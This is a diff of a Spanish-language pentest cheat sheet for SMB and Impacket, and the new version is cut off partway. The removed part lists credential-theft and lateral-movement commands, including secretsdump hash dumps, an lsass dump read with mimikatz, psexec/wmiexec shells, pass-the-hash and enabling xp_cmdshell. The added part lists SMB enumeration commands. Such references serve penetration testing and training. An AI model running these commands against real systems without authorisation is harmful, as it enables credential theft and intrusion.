@@ -1,315 +1,328 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cheat Sheet SMB / Impacket</title>
-    <link rel="stylesheet" href="../styles.css">
-</head>
-<body>
-    <h1 class="main-title">SMB / Impacket — Enumeración y Explotación Windows</h1>
+<!--
+  HOJA DE REFERENCIA: SMB / Impacket — Enumeración y Explotación Windows
+  =======================================================================
+  Este documento es una cheat sheet interactiva con pestañas y búsqueda.
+-->
 
-    <h2 class="sr-only">Navegación</h2>
-    <div class="main-container">
-        <a href="../index.html" class="back-link">← Volver al Índice</a>
+<link rel="stylesheet" href="../styles.css" />
 
-        <div class="tabs-main">
-            <button class="tab-main" onclick="showMainTab(event, 'enum')">Enumeración</button>
-            <button class="tab-main" onclick="showMainTab(event, 'smbclient')">SMBClient</button>
-            <button class="tab-main" onclick="showMainTab(event, 'enum4linux')">Enum4linux</button>
-            <button class="tab-main" onclick="showMainTab(event, 'nmap')">Nmap SMB</button>
-            <button class="tab-main" onclick="showMainTab(event, 'impacket')">Impacket</button>
-            <button class="tab-main" onclick="showMainTab(event, 'psexec')">PSExec / PassTheHash</button>
-        </div>
+<!-- TÍTULO VISIBLE CENTRADO -->
+<h1 class="main-title">SMB / Impacket — Enumeración y Explotación Windows</h1>
 
-        <!-- Buscador -->
-        <div class="search-box">
-            <input type="text" id="search" placeholder="Buscar comando..." oninput="filterCmds()">
-        </div>
+<!-- TÍTULO ACCESIBLE (solo para lectores de pantalla) -->
+<h2 class="sr-only">Referencia interactiva de comandos SMB e Impacket para enumeración y explotación Windows</h2>
 
-        <div class="allCmds" id="allCmds">
+<!--  CONTENEDOR PRINCIPAL-->
+<div class="main-container">
+  <!-- BOTÓN VOLVER AL INICIO -->
+  <div class="back-wrapper">
+    <a href="../index.html" class="back-link">
+      &larr; Volver al inicio
+    </a>
+  </div>
 
-            <!-- ========== ENUMERACIÓN ========== -->
-            <div class="tabs tab-content active" id="enum">
-                <div class="subtabs">
-                    <button class="tabsub-btn active" onclick="showSubTab(event, 'enum', 'general')">General</button>
-                    <button class="tabsub-btn" onclick="showSubTab(event, 'enum', 'null')">Null Sessions</button>
-                    <button class="tabsub-btn" onclick="showSubTab(event, 'enum', 'users')">Usuarios</button>
-                </div>
+  <!-- PESTAÑAS PRINCIPALES -->
+  <div class="tabs-main">
+    <button class="tab-main active" onclick="showMainTab('enum')">Enumeración</button>
+    <button class="tab-main" onclick="showMainTab('smbclient')">SMBClient</button>
+    <button class="tab-main" onclick="showMainTab('enum4linux')">Enum4linux</button>
+    <button class="tab-main" onclick="showMainTab('nmap')">Nmap SMB</button>
+    <button class="tab-main" onclick="showMainTab('impacket')">Impacket</button>
+    <button class="tab-main" onclick="showMainTab('psexec')">PSExec / PassTheHash</button>
+  </div>
 
-                <!-- General -->
-                <div class="subtab-content active" id="enum-general">
-                    <div class="cmd-group">
-                        <h3 class="cmd-group-title">Enumeración SMB</h3>
-                        <div class="cmd-row"><span class="cmd-name">smbclient -L //IP -N</span><span class="cmd-desc">Listar shares (sin auth)</span></div>
-                        <div class="cmd-row"><span class="cmd-name">smbclient -L //IP -U user%pass</span><span class="cmd-desc">Listar shares con credenciales</span></div>
-                        <div class="cmd-row"><span class="cmd-name">smbclient //IP/share -U user%pass</span><span class="cmd-desc">Conectar a share específico</span></div>
-                        <div class="cmd-row"><span class="cmd-name">smbclient -L //IP -N -p 445</span><span class="cmd-desc">Especificar puerto SMB</span></div>
-                    </div>
-                    <div class="cmd-group">
-                        <h3 class="cmd-group-title">Nmap Scripts SMB</h3>
-                        <div class="cmd-row"><span class="cmd-name">nmap -p 445 --script smb-enum-shares</span><span class="cmd-desc">Enumerar shares</span></div>
-                        <div class="cmd-row"><span class="cmd-name">nmap -p 445 --script smb-enum-users</span><span class="cmd-desc">Enumerar usuarios</span></div>
-                        <div class="cmd-row"><span class="cmd-name">nmap -p 445 --script smb-os-discovery</span><span class="cmd-desc">Descubrir OS</span></div>
-                        <div class="cmd-row"><span class="cmd-name">nmap -p 445 --script smb-security-mode</span><span class="cmd-desc">Modo de seguridad SMB</span></div>
-                        <div class="cmd-row"><span class="cmd-name">nmap -p 445 --script smb-vuln-ms17-010</span><span class="cmd-desc">Verificar EternalBlue</span></div>
-                    </div>
-                </div>
+  <!-- PESTAÑAS SECUNDARIAS: Enumeración -->
+  <div id="subtabs-enum" class="subtabs">
+    <div class="inner">
+      <button class="subtab active" onclick="showSubTab('enum-general')">General</button>
+      <button class="subtab" onclick="showSubTab('enum-null')">Null Sessions</button>
+      <button class="subtab" onclick="showSubTab('enum-users')">Usuarios</button>
+    </div>
+  </div>
 
-                <!-- Null Sessions -->
-                <div class="subtab-content" id="enum-null">
-                    <div class="cmd-group">
-                        <h3 class="cmd-group-title">Null Session</h3>
-                        <div class="cmd-row"><span class="cmd-name">smbclient -L //IP -N</span><span class="cmd-desc">Null session con smbclient</span></div>
-                        <div class="cmd-row"><span class="cmd-name">enum4linux -a -U "" -P "" //IP</span><span class="cmd-desc">Null session con enum4linux</span></div>
-                        <div class="cmd-row"><span class="cmd-name">rpcclient -U "" //IP</span><span class="cmd-desc">Null session con rpcclient</span></div>
-                        <div class="cmd-row"><span class="cmd-name">smbclient //IP/share -N</span><span class="cmd-desc">Conectar a share sin auth</span></div>
-                    </div>
-                </div>
+  <!-- PESTAÑAS SECUNDARIAS: SMBClient -->
+  <div id="subtabs-smbclient" class="subtabs hidden">
+    <div class="inner">
+      <button class="subtab active" onclick="showSubTab('smbclient-connect')">Conexión</button>
+      <button class="subtab" onclick="showSubTab('smbclient-files')">Archivos</button>
+      <button class="subtab" onclick="showSubTab('smbclient-upload')">Upload / Download</button>
+    </div>
+  </div>
 
-                <!-- Usuarios -->
-                <div class="subtab-content" id="enum-users">
-                    <div class="cmd-group">
-                        <h3 class="cmd-group-title">Enumaración de Usuarios</h3>
-                        <div class="cmd-row"><span class="cmd-name">enum4linux -U //IP</span><span class="cmd-desc">Enumerar usuarios</span></div>
-                        <div class="cmd-row"><span class="cmd-name">enum4linux -a //IP</span><span class="cmd-desc">Enumeración completa (users, shares, policies)</span></div>
-                        <div class="cmd-row"><span class="cmd-name">nmap -p 445 --script smb-enum-users --script-args smbuser=Administrator,smbpass=P@ss</span><span class="cmd-desc">Users con autenticación</span></div>
-                        <div class="cmd-row"><span class="cmd-name">crackmapexec smb IP --users</span><span class="cmd-desc">Users con crackmapexec</span></div>
-                    </div>
-                </div>
-            </div>
+  <!-- PESTAÑAS SECUNDARIAS: Enum4linux -->
+  <div id="subtabs-enum4linux" class="subtabs hidden">
+    <div class="inner">
+      <button class="subtab active" onclick="showSubTab('enum4linux-basic')">Básico</button>
+      <button class="subtab" onclick="showSubTab('enum4linux-shares')">Shares</button>
+      <button class="subtab" onclick="showSubTab('enum4linux-policies')">Políticas</button>
+    </div>
+  </div>
 
-            <!-- ========== SMBCLIENT ========== -->
-            <div class="tabs tab-content" id="smbclient">
-                <div class="subtabs">
-                    <button class="tabsub-btn active" onclick="showSubTab(event, 'smbclient', 'connect')">Conexión</button>
-                    <button class="tabsub-btn" onclick="showSubTab(event, 'smbclient', 'files')">Archivos</button>
-                    <button class="tabsub-btn" onclick="showSubTab(event, 'smbclient', 'upload')">Upload / Download</button>
-                </div>
+  <!-- PESTAÑAS SECUNDARIAS: Nmap SMB -->
+  <div id="subtabs-nmap" class="subtabs hidden">
+    <div class="inner">
+      <button class="subtab active" onclick="showSubTab('nmap-scripts')">Scripts</button>
+      <button class="subtab" onclick="showSubTab('nmap-vulns')">Vulnerabilidades</button>
+    </div>
+  </div>
 
-                <!-- Conexión -->
-                <div class="subtab-content active" id="smbclient-connect">
-                    <div class="cmd-group">
-                        <h3 class="cmd-group-title">Conexión SMBClient</h3>
-                        <div class="cmd-row"><span class="cmd-name">smbclient //IP/share -U user%pass</span><span class="cmd-desc">Conectar con credenciales</span></div>
-                        <div class="cmd-row"><span class="cmd-name">smbclient //IP/share -N</span><span class="cmd-desc">Conectar sin autenticación</span></div>
-                        <div class="cmd-row"><span class="cmd-name">smbclient //IP/share -L //IP -U user%pass</span><span class="cmd-desc">Listar shares primero</span></div>
-                        <div class="cmd-row"><span class="cmd-name">smbclient -c "ls" //IP/share -U user%pass</span><span class="cmd-desc">Listar directorio remoto</span></div>
-                    </div>
-                </div>
+  <!-- PESTAÑAS SECUNDARIAS: Impacket -->
+  <div id="subtabs-impacket" class="subtabs hidden">
+    <div class="inner">
+      <button class="subtab active" onclick="showSubTab('impacket-secrets')">SecretsDump</button>
+      <button class="subtab" onclick="showSubTab('impacket-wmi')">WMIExec</button>
+      <button class="subtab" onclick="showSubTab('impacket-smb')">SMBExec</button>
+      <button class="subtab" onclick="showSubTab('impacket-mssql')">MSSQL</button>
+    </div>
+  </div>
 
-                <!-- Archivos -->
-                <div class="subtab-content" id="smbclient-files">
-                    <div class="cmd-group">
-                        <h3 class="cmd-group-title">Navegación en SMBClient</h3>
-                        <div class="cmd-row"><span class="cmd-name">ls</span><span class="cmd-desc">Listar archivos</span></div>
-                        <div class="cmd-row"><span class="cmd-name">cd directorio</span><span class="cmd-desc">Cambiar directorio</span></div>
-                        <div class="cmd-row"><span class="cmd-name">pwd</span><span class="cmd-desc">Directorio actual</span></div>
-                        <div class="cmd-row"><span class="cmd-name">dir</span><span class="cmd-desc">Listar archivos (alternativo)</span></div>
-                        <div class="cmd-row"><span class="cmd-name">mkdir</span><span class="cmd-desc">Crear directorio</span></div>
-                        <div class="cmd-row"><span class="cmd-name">rmdir</span><span class="cmd-desc">Eliminar directorio</span></div>
-                    </div>
-                </div>
+  <!-- PESTAÑAS SECUNDARIAS: PSExec / PassTheHash -->
+  <div id="subtabs-psexec" class="subtabs hidden">
+    <div class="inner">
+      <button class="subtab active" onclick="showSubTab('psexec-psexec')">PSExec</button>
+      <button class="subtab" onclick="showSubTab('psexec-pth')">Pass-the-Hash</button>
+      <button class="subtab" onclick="showSubTab('psexec-kerberos')">Kerberos</button>
+    </div>
+  </div>
 
-                <!-- Upload / Download -->
-                <div class="subtab-content" id="smbclient-upload">
-                    <div class="cmd-group">
-                        <h3 class="cmd-group-title">Upload / Download</h3>
-                        <div class="cmd-row"><span class="cmd-name">get archivo.txt</span><span class="cmd-desc">Descargar archivo</span></div>
-                        <div class="cmd-row"><span class="cmd-name">get archivo.txt /local/path</span><span class="cmd-desc">Descargar a ruta local</span></div>
-                        <div class="cmd-row"><span class="cmd-name">put archivo.txt</span><span class="cmd-desc">Subir archivo</span></div>
-                        <div class="cmd-row"><span class="cmd-name">put /local/path/archivo.txt</span><span class="cmd-desc">Subir desde ruta local</span></div>
-                        <div class="cmd-row"><span class="cmd-name">mget *.txt</span><span class="cmd-desc">Descargar todos los .txt</span></div>
-                        <div class="cmd-row"><span class="cmd-name">mput *.txt</span><span class="cmd-desc">Subir todos los .txt locales</span></div>
-                    </div>
-                </div>
-            </div>
+  <!-- CAJA DE BÚSQUEDA -->
+  <input class="search-box" type="text" placeholder="Buscar comando o parámetro..." oninput="filterCmds(this.value)"
+    id="searchInput" />
 
-            <!-- ========== ENUM4LINUX ========== -->
-            <div class="tabs tab-content" id="enum4linux">
-                <div class="subtabs">
-                    <button class="tabsub-btn active" onclick="showSubTab(event, 'enum4linux', 'basic')">Básico</button>
-                    <button class="tabsub-btn" onclick="showSubTab(event, 'enum4linux', 'shares')">Shares</button>
-                    <button class="tabsub-btn" onclick="showSubTab(event, 'enum4linux', 'policies')">Políticas</button>
-                </div>
+  <div id="allCmds">
 
-                <!-- Básico -->
-                <div class="subtab-content active" id="enum4linux-basic">
-                    <div class="cmd-group">
-                        <h3 class="cmd-group-title">Enum4linux Básico</h3>
-                        <div class="cmd-row"><span class="cmd-name">enum4linux -a //IP</span><span class="cmd-desc">Enumeración completa</span></div>
-                        <div class="cmd-row"><span class="cmd-name">enum4linux -U //IP</span><span class="cmd-desc">Solo usuarios</span></div>
-                        <div class="cmd-row"><span class="cmd-name">enum4linux -S //IP</span><span class="cmd-desc">Solo shares</span></div>
-                        <div class="cmd-row"><span class="cmd-name">enum4linux -P //IP</span><span class="cmd-desc">Solo políticas de password</span></div>
-                        <div class="cmd-row"><span class="cmd-name">enum4linux -o //IP</span><span class="cmd-desc">Info del OS</span></div>
-                        <div class="cmd-row"><span class="cmd-name">enum4linux -n //IP</span><span class="cmd-desc">Nombres de NetBIOS</span></div>
-                    </div>
-                </div>
-
-                <!-- Shares -->
-                <div class="subtab-content" id="enum4linux-shares">
-                    <div class="cmd-group">
-                        <h3 class="cmd-group-title">Shares con Credenciales</h3>
-                        <div class="cmd-row"><span class="cmd-name">enum4linux -a -U user%pass //IP</span><span class="cmd-desc">Enum completa con credenciales</span></div>
-                        <div class="cmd-row"><span class="cmd-name">enum4linux -S -U user%pass //IP</span><span class="cmd-desc">Shares con autenticación</span></div>
-                        <div class="cmd-row"><span class="cmd-name">enum4linux -a -u user -p pass //IP</span><span class="cmd-desc">Formato alternativo user/pass</span></div>
-                    </div>
-                </div>
-
-                <!-- Políticas -->
-                <div class="subtab-content" id="enum4linux-policies">
-                    <div class="cmd-group">
-                        <h3 class="cmd-group-title">Políticas de Password</h3>
-                        <div class="cmd-row"><span class="cmd-name">enum4linux -P //IP</span><span class="cmd-desc">Políticas de password</span></div>
-                        <div class="cmd-row"><span class="cmd-name">enum4linux -G //IP</span><span class="cmd-desc">Políticas de grupo</span></div>
-                        <div class="cmd-row"><span class="cmd-name">enum4linux -C //IP</span><span class="cmd-desc">Contraseñas de usuario (si accesible)</span></div>
-                    </div>
-                </div>
-            </div>
-
-            <!-- ========== NMAP SMB ========== -->
-            <div class="tabs tab-content" id="nmap">
-                <div class="subtabs">
-                    <button class="tabsub-btn active" onclick="showSubTab(event, 'nmap', 'scripts')">Scripts</button>
-                    <button class="tabsub-btn" onclick="showSubTab(event, 'nmap', 'vulns')">Vulnerabilidades</button>
-                </div>
-
-                <!-- Scripts -->
-                <div class="subtab-content active" id="nmap-scripts">
-                    <div class="cmd-group">
-                        <h3 class="cmd-group-title">Nmap SMB Scripts</h3>
-                        <div class="cmd-row"><span class="cmd-name">nmap -p 445 --script smb-enum-shares.nse</span><span class="cmd-desc">Enumerar shares</span></div>
-                        <div class="cmd-row"><span class="cmd-name">nmap -p 445 --script smb-enum-users.nse</span><span class="cmd-desc">Enumerar usuarios</span></div>
-                        <div class="cmd-row"><span class="cmd-name">nmap -p 445 --script smb-os-discovery.nse</span><span class="cmd-desc">Descubrir OS</span></div>
-                        <div class="cmd-row"><span class="cmd-name">nmap -p 445 --script smb-security-mode.nse</span><span class="cmd-desc">Modo de seguridad</span></div>
-                        <div class="cmd-row"><span class="cmd-name">nmap -p 445 --script smb-stat-share.nse</span><span class="cmd-desc">Estado de shares</span></div>
-                        <div class="cmd-row"><span class="cmd-name">nmap -p 445 --script smb-enum-shares,smb-enum-users</span><span class="cmd-desc">Múltiples scripts</span></div>
-                    </div>
-                </div>
-
-                <!-- Vulnerabilidades -->
-                <div class="subtab-content" id="nmap-vulns">
-                    <div class="cmd-group">
-                        <h3 class="cmd-group-title">Verificación de Vulns SMB</h3>
-                        <div class="cmd-row"><span class="cmd-name">nmap -p 445 --script smb-vuln-ms17-010</span><span class="cmd-desc">EternalBlue</span></div>
-                        <div class="cmd-row"><span class="cmd-name">nmap -p 445 --script smb-vuln-ms08-067</span><span class="cmd-desc">MS08-067</span></div>
-                        <div class="cmd-row"><span class="cmd-name">nmap -p 445 --script smb-vuln-ms10-061</span><span class="cmd-desc">MS10-061</span></div>
-                        <div class="cmd-row"><span class="cmd-name">nmap -p 445 --script smb-vuln-cve2017-7494</span><span class="cmd-desc">SambaCry</span></div>
-                        <div class="cmd-row"><span class="cmd-name">nmap -p 445 --script smb-vuln-ms15-020</span><span class="cmd-desc">MS15-020</span></div>
-                    </div>
-                </div>
-            </div>
-
-            <!-- ========== IMPACKET ========== -->
-            <div class="tabs tab-content" id="impacket">
-                <div class="subtabs">
-                    <button class="tabsub-btn active" onclick="showSubTab(event, 'impacket', 'secrets')">SecretsDump</button>
-                    <button class="tabsub-btn" onclick="showSubTab(event, 'impacket', 'wmi')">WMIExec</button>
-                    <button class="tabsub-btn" onclick="showSubTab(event, 'impacket', 'smb')">SMBExec</button>
-                    <button class="tabsub-btn" onclick="showSubTab(event, 'impacket', 'mssql')">MSSQL</button>
-                </div>
-
-                <!-- SecretsDump -->
-                <div class="subtab-content active" id="impacket-secrets">
-                    <div class="cmd-group">
-                        <h3 class="cmd-group-title">SecretsDump</h3>
-                        <div class="cmd-row"><span class="cmd-name">impacket-secretsdump user:pass@IP</span><span class="cmd-desc">Dump de hashes SAM + LSA</span></div>
-                        <div class="cmd-row"><span class="cmd-name">impacket-secretsdump -hashes :HASH user@IP</span><span class="cmd-desc">Pass-the-Hash</span></div>
-                        <div class="cmd-row"><span class="cmd-name">impacket-secretsdump -just-dc-ntlm user:pass@IP</span><span class="cmd-desc">Solo NTLM hashes del DC</span></div>
-                        <div class="cmd-row"><span class="cmd-name">impacket-secretsdump -just-dc-user admin user:pass@IP</span><span class="cmd-desc">Hash de usuario específico del DC</span></div>
-                        <div class="cmd-row"><span class="cmd-name">impacket-secretsdump -sam sam.save -system system.save -security security.save</span><span class="cmd-desc">Archivos SAM/SECURITY offline</span></div>
-                    </div>
-                    <div class="cmd-group">
-                        <h3 class="cmd-group-title">LSASS Dump</h3>
-                        <div class="cmd-row"><span class="cmd-name">procdump -accepteula -ma lsass.exe lsass.dmp</span><span class="cmd-desc">Dump de lsass.exe con procdump</span></div>
-                        <div class="cmd-row"><span class="cmd-name">mimikatz # sekurlsa::minidump lsass.dmp</span><span class="cmd-desc">Cargar dump en mimikatz</span></div>
-                        <div class="cmd-row"><span class="cmd-name">mimikatz # sekurlsa::logonpasswords</span><span class="cmd-desc">Extraer credenciales</span></div>
-                    </div>
-                </div>
-
-                <!-- WMIExec -->
-                <div class="subtab-content" id="impacket-wmi">
-                    <div class="cmd-group">
-                        <h3 class="cmd-group-title">WMIExec</h3>
-                        <div class="cmd-row"><span class="cmd-name">impacket-wmiexec user:pass@IP</span><span class="cmd-desc">Shell semi-interactiva via WMI</span></div>
-                        <div class="cmd-row"><span class="cmd-name">impacket-wmiexec -hashes :HASH user@IP</span><span class="cmd-desc">WMIExec con Pass-the-Hash</span></div>
-                        <div class="cmd-row"><span class="cmd-name">impacket-wmiexec user:pass@IP "whoami"</span><span class="cmd-desc">Ejecutar comando específico</span></div>
-                        <div class="cmd-row"><span class="cmd-name">impacket-wmiexec -path /tmp user:pass@IP</span><span class="cmd-desc">Directorio de trabajo custom</span></div>
-                    </div>
-                </div>
-
-                <!-- SMBExec -->
-                <div class="subtab-content" id="impacket-smb">
-                    <div class="cmd-group">
-                        <h3 class="cmd-group-title">SMBExec</h3>
-                        <div class="cmd-row"><span class="cmd-name">impacket-smbexec user:pass@IP</span><span class="cmd-desc">Shell semi-interactiva via SMB</span></div>
-                        <div class="cmd-row"><span class="cmd-name">impacket-smbexec -hashes :HASH user@IP</span><span class="cmd-desc">SMBExec con Pass-the-Hash</span></div>
-                        <div class="cmd-row"><span class="cmd-name">impacket-smbexec user:pass@IP "net user"</span><span class="cmd-desc">Ejecutar comando</span></div>
-                    </div>
-                </div>
-
-                <!-- MSSQL -->
-                <div class="subtab-content" id="impacket-mssql">
-                    <div class="cmd-group">
-                        <h3 class="cmd-group-title">MSSQLClient</h3>
-                        <div class="cmd-row"><span class="cmd-name">impacket-mssqlclient user:pass@IP</span><span class="cmd-desc">Conectar a MSSQL</span></div>
-                        <div class="cmd-row"><span class="cmd-name">impacket-mssqlclient -windows-auth user:pass@IP</span><span class="cmd-desc">Autenticación Windows</span></div>
-                        <div class="cmd-row"><span class="cmd-name">impacket-mssqlclient user:pass@IP --enable-xp_cmdshell</span><span class="cmd-desc">Habilitar xp_cmdshell</span></div>
-                        <div class="cmd-row"><span class="cmd-name">impacket-mssqlclient user:pass@IP -c "xp_cmdshell whoami"</span><span class="cmd-desc">Ejecutar cmd via MSSQL</span></div>
-                    </div>
-                </div>
-            </div>
-
-            <!-- ========== PSEXEC / PASSTHEHASH ========== -->
-            <div class="tabs tab-content" id="psexec">
-                <div class="subtabs">
-                    <button class="tabsub-btn active" onclick="showSubTab(event, 'psexec', 'psexec')">PSExec</button>
-                    <button class="tabsub-btn" onclick="showSubTab(event, 'psexec', 'pth')">Pass-the-Hash</button>
-                    <button class="tabsub-btn" onclick="showSubTab(event, 'psexec', 'kerberos')">Kerberos</button>
-                </div>
-
-                <!-- PSExec -->
-                <div class="subtab-content active" id="psexec-psexec">
-                    <div class="cmd-group">
-                        <h3 class="cmd-group-title">PSExec</h3>
-                        <div class="cmd-row"><span class="cmd-name">impacket-psexec user:pass@IP</span><span class="cmd-desc">Shell interactiva via SMB</span></div>
-                        <div class="cmd-row"><span class="cmd-name">impacket-psexec -hashes :HASH user@IP</span><span class="cmd-desc">PSExec con Pass-the-Hash</span></div>
-                        <div class="cmd-row"><span class="cmd-name">impacket-psexec user:pass@IP "cmd.exe /c whoami"</span><span class="cmd-desc">Comando específico</span></div>
-                        <div class="cmd-row"><span class="cmd-name">psexec.py user:pass@IP -s cmd.exe</span><span class="cmd-desc">Shell como SYSTEM (-s)</span></div>
-                    </div>
-                </div>
-
-                <!-- Pass-the-Hash -->
-                <div class="subtab-content" id="psexec-pth">
-                    <div class="cmd-group">
-                        <h3 class="cmd-group-title">Pass-the-Hash</h3>
-                        <div class="cmd-row"><span class="cmd-name">impacket-psexec -hashes :HASH user@IP</span><span class="cmd-desc">PTH con PSExec</span></div>
-                        <div class="cmd-row"><span class="cmd-name">impacket-wmiexec -hashes :HASH user@IP</span><span class="cmd-desc">PTH con WMIExec</span></div>
-                        <div class="cmd-row"><span class="cmd-name">impacket-smbexec -hashes :HASH user@IP</span><span class="cmd-desc">PTH con SMBExec</span></div>
-                        <div class="cmd-row"><span class="cmd-name">impacket-secretsdump -hashes :HASH user@IP</span><span class="cmd-desc">PTH con SecretsDump</span></div>
-                    </div>
-                    <div class="cmd-group">
-                        <h3 class="cmd-group-title">Formato de Hash</h3>
-                        <div class="cmd-row"><span class="cmd-name">-hashes :NTLM_HASH</span><span class="cmd-desc">Formato para Pass-the-Hash</span></div>
-                        <div class="cmd-row"><span class="cmd-name">-hashes LM_HASH:NTLM_HASH</span><span class="cmd-desc">Formato con LM + NTLM</span></div>
-                    </div>
-                </div>
-
-                <!-- Kerberos -->
-                <div class="subtab-content" id="psexec-kerberos">
-                    <div class="cmd-group">
-                        <h3 class="cmd-group-title">Kerberos Authentication</h3>
-                        <div class="cmd-row"><span class="cmd-name">impacket-psexec -dc-ip DC_IP -k domain/user:pass@target</span><span class="cmd-desc">Kerberos auth</span></div>
-                        <div class="cmd-row"><span class="cmd-name">impacket-wmiexec -dc-ip DC_IP -k domain/user:pass@target</span><span class="cmd-desc">WMIExec con Kerberos</span></div>
-                        <div class="cmd-row"><span class="cmd-name">export KRB5CCNAME=/tmp/ticket.ccache</span><span class="cmd-desc">Setear ticket Kerberos</span></div>
-                        <div class="cmd-row"><span class="cmd-name">impacket-psexec -k -no-pass domain/user@target</span><span class="cmd-desc">Usar ticket existente</span></div>
-                    </div>
-                </div>
-            </div>
-
-        </div>
+    <!-- #################### ENUMERACIÓN #################### -->
+    <!-- ENUM - GENERAL -->
+    <div class="section active" id="tab-enum-general" data-group="enum-general">
+      <div class="cmd-group">
+        <div class="group-title">Enumeración SMB</div>
+        <div class="cmd-row"><span class="cmd-name">smbclient -L //IP -N</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Listar shares (sin auth).<br><span class="param">-L</span> list · <span class="param">-N</span> null session</span></div>
+        <div class="cmd-row"><span class="cmd-name">smbclient -L //IP -U user%pass</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Listar shares con credenciales.<br><span class="param">-U</span> usuario%contraseña</span></div>
+        <div class="cmd-row"><span class="cmd-name">smbclient //IP/share -U user%pass</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Conectar a share específico.<br><span class="param">//IP/share</span> ruta del share</span></div>
+        <div class="cmd-row"><span class="cmd-name">smbclient -L //IP -N -p 445</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Especificar puerto SMB.<br><span class="param">-p</span> puerto</span></div>
+      </div>
+      <div class="cmd-group">
+        <div class="group-title">Nmap Scripts SMB</div>
+        <div class="cmd-row"><span class="cmd-name">nmap -p 445 --script smb-enum-shares</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Enumerar shares.<br><span class="param">--script smb-enum-shares</span> script NSE</span></div>
+        <div class="cmd-row"><span class="cmd-name">nmap -p 445 --script smb-enum-users</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Enumerar usuarios.<br><span class="param">--script smb-enum-users</span> script NSE</span></div>
+        <div class="cmd-row"><span class="cmd-name">nmap -p 445 --script smb-os-discovery</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Descubrir OS.<br><span class="param">--script smb-os-discovery</span> script NSE</span></div>
+        <div class="cmd-row"><span class="cmd-name">nmap -p 445 --script smb-security-mode</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Modo de seguridad SMB.<br><span class="param">--script smb-security-mode</span> script NSE</span></div>
+        <div class="cmd-row"><span class="cmd-name">nmap -p 445 --script smb-vuln-ms17-010</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Verificar EternalBlue.<br><span class="param">--script smb-vuln-ms17-010</span> verificar CVE</span></div>
+      </div>
     </div>
 
-    <script src="../scripts.js"></script>
-</body>
-</html>
+    <!-- ENUM - NULL SESSIONS -->
+    <div class="section" id="tab-enum-null" data-group="enum-null">
+      <div class="cmd-group">
+        <div class="group-title">Null Session</div>
+        <div class="cmd-row"><span class="cmd-name">smbclient -L //IP -N</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Null session con smbclient.<br><span class="param">-N</span> sin password</span></div>
+        <div class="cmd-row"><span class="cmd-name">enum4linux -a -U "" -P "" //IP</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Null session con enum4linux.<br><span class="param">-U "" -P ""</span> usuario y pass vacíos</span></div>
+        <div class="cmd-row"><span class="cmd-name">rpcclient -U "" //IP</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Null session con rpcclient.<br><span class="param">-U ""</span> sin credenciales</span></div>
+        <div class="cmd-row"><span class="cmd-name">smbclient //IP/share -N</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Conectar a share sin auth.<br><span class="param">-N</span> null session</span></div>
+      </div>
+    </div>
+
+    <!-- ENUM - USUARIOS -->
+    <div class="section" id="tab-enum-users" data-group="enum-users">
+      <div class="cmd-group">
+        <div class="group-title">Enumeración de Usuarios</div>
+        <div class="cmd-row"><span class="cmd-name">enum4linux -U //IP</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Enumerar usuarios.<br><span class="param">-U</span> enumerate users</span></div>
+        <div class="cmd-row"><span class="cmd-name">enum4linux -a //IP</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Enumeración completa (users, shares, policies).<br><span class="param">-a</span> todo</span></div>
+        <div class="cmd-row"><span class="cmd-name">nmap -p 445 --script smb-enum-users --script-args smbuser=Administrator,smbpass=P@ss</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Users con autenticación.<br><span class="param">--script-args</span> argumentos del script</span></div>
+        <div class="cmd-row"><span class="cmd-name">crackmapexec smb IP --users</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Users con crackmapexec.<br><span class="param">--users</span> enumerar usuarios</span></div>
+      </div>
+    </div>
+
+    <!-- #################### SMBCLIENT #################### -->
+    <!-- SMBCLIENT - CONEXIÓN -->
+    <div class="section" id="tab-smbclient-connect" data-group="smbclient-connect">
+      <div class="cmd-group">
+        <div class="group-title">Conexión SMBClient</div>
+        <div class="cmd-row"><span class="cmd-name">smbclient //IP/share -U user%pass</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Conectar con credenciales.<br><span class="param">-U</span> usuario%contraseña</span></div>
+        <div class="cmd-row"><span class="cmd-name">smbclient //IP/share -N</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Conectar sin autenticación.<br><span class="param">-N</span> null session</span></div>
+        <div class="cmd-row"><span class="cmd-name">smbclient //IP/share -L //IP -U user%pass</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Listar shares primero.<br><span class="param">-L</span> listar antes de conectar</span></div>
+        <div class="cmd-row"><span class="cmd-name">smbclient -c "ls" //IP/share -U user%pass</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Listar directorio remoto.<br><span class="param">-c</span> comando a ejecutar</span></div>
+      </div>
+    </div>
+
+    <!-- SMBCLIENT - ARCHIVOS -->
+    <div class="section" id="tab-smbclient-files" data-group="smbclient-files">
+      <div class="cmd-group">
+        <div class="group-title">Navegación en SMBClient</div>
+        <div class="cmd-row"><span class="cmd-name">ls</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Listar archivos.<br><span class="param">ls</span> listar directorio</span></div>
+        <div class="cmd-row"><span class="cmd-name">cd directorio</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Cambiar directorio.<br><span class="param">cd</span> change directory</span></div>
